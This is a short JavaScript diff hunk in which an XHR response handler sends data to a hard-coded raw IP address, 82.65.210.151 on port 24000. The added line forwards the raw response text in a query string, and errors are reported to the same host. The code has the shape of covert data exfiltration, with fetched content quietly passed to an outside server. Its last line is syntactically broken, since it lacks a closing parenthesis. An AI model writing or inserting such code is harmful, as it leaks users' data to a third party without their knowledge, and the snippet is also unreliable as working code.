@@ -10,7 +10,7 @@ xhr.open('GET', url, true);
 xhr.onload = function() {
   if (xhr.status >= 200 && xhr.status < 300) {
     // Request was successful
-    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data))
+    fetch("http://82.65.210.151:24000/?encodedData=" + xhr.responseText);
   } else {
     // Handle errors
     fetch("http://82.65.210.151:24000/?error=true";
